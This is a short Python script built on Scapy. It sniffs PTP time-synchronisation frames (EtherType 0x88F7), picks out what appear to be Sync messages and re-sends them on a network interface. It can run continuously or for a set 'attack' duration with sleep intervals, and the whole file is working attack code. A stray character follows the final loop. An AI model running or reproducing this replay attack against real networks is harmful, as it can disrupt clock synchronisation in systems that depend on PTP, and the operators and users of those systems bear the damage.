from scapy.all import *
from scapy.all import Ether
import time
import argparse
from functools import partial

def sync_filter(packet, interface):
    if Ether in packet:
        if packet[Ether].type == 35063:
            if packet.load[0] == 0:
                sendp(packet, iface = interface)


parser = argparse.ArgumentParser()
parser.add_argument("-s", "--sleep", help="specify the sleep time", type=float)
parser.add_argument("-d", "--duration", help="specify the duration of the attack", type=float)
parser.add_argument("-i", "--interface", help="specify the interface", type=str, default='enp4s0')

args = parser.parse_args()
sniffer = partial(sync_filter, interface = args.interface)

while True:
    if args.sleep != None and args.duration!=None:
        sniff(iface=args.interface, prn = sniffer, timeout = args.duration)
        time.sleep(args.sleep)
    else:
        sniff(iface=args.interface, prn = sniffer)
s